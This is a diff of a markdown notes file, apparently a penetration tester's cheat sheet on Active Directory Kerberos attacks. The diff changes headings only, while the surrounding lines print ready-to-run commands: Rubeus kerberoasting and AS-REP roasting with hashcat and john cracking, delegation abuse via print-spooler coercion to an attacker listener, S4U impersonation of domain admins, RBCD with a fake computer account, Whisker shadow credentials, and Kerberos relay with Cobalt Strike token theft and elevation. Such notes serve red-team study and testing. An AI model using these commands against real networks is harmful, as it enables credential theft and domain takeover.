@@ -1,6 +1,6 @@
 # Kerberos notes
 
-**Kerberoasting**
+## Kerberoasting
 
 Request the TGS for services running under the context of domain accounts to crack offline
 
@@ -21,7 +21,7 @@ execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:<User> /nowrap
 ```
 
-**ASREP Roast**
+## ASREP Roast
 
 Users with no kerberos pre-auth can be requested and their can be cracked offline
 
@@ -37,7 +37,7 @@ john --format=krb5asrep --wordlist=wordlist hash
 hashcat -a 0 -m 18200 hash wordlist
 ```
 
-**Unconstrained Delegation**
+## Unconstrained Delegation
 
 A machine or user is allowed to act on the behalf of another with no restrictions
 
@@ -60,7 +60,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <target> <attacker owned listener>
 ```
 
-**Constrained Delegation**
+## Constrained Delegation
 
 Similar to unconstrained but the delegation attempts to restrict services the server can act on behalf of a user
 
@@ -83,14 +83,14 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /pr
 steal_token 5540
 ```
 
-**Alternate Service Name**
+## Alternate Service Name
 
 The SPN information in the ticket is not encrypted and can be changed arbitrarily.  We can request a service ticket for a service, such as CIFS, but then modify the SPN to something different, such as LDAP, and the target service will accept it 
 ```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:<domain admin wanted to impersonate> /msdsspn:cifs/<DC domain name> /altservice:ldap /user:<current user> /ticket:doIFpD[...]MuSU8= /nowrap
 ```
 
-**S4U2Self Abuse**
+## S4U2Self Abuse
 
 Rubeus being used to abuse the S4U2Self to obtain a usable TGS as a local admin user using the /self flag  
 ```
@@ -98,7 +98,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateu
 steal_token <PID>
 ```
 
-**Resource-Based Constrained Delegation**
+## Resource-Based Constrained Delegation
 
 This query will obtain every domain computer and read their ACL, filtering on the interesting rights
 - WriteProperty
@@ -142,7 +142,7 @@ CS:
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:<aes key> /nowrap
 ```
 
-**Shadow Credentials**
+## Shadow Credentials
 
 Raw key data can be used rather than a certificate in a Key Trust model, this stores a client key on their own domain object in an attribute called msDS-KeyCredentialLink. If you can write to this attribute on a user or computer object you can obtain a TGT for that principal. A DACL-style abuse as with RBCD.
 Tools: [Whisker](https://github.com/eladshamir/Whisker)
@@ -159,7 +159,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2
 execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$
 ```
 
-**Kerberos Relay Attacks**
+## Kerberos Relay Attacks
 
 Tools: [KrbRelay](https://github.com/cube0x0/KrbRelay), automated tool: [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
 
@@ -168,7 +168,7 @@ krbrelay is too large on default so increase beacon task size
 set tasks_max_size "2097152";
 ```
 
-### RBCD with kerberos relay
+## RBCD with kerberos relay
 
 Tools: [SCMUACBypass](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)
 steps:
@@ -194,7 +194,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilCom
 elevate svc-exe-krb tcp-local
 ```
 
-### Shadow creds with kerberos relay
+## Shadow creds with kerberos relay
 
 The advantage of using shadow credentials over RBCD is that we don't need to add a fake computer to the domain.  
 1. First, verify that your machine account has nothing in its msDS-KeyCredentialLink attribute.
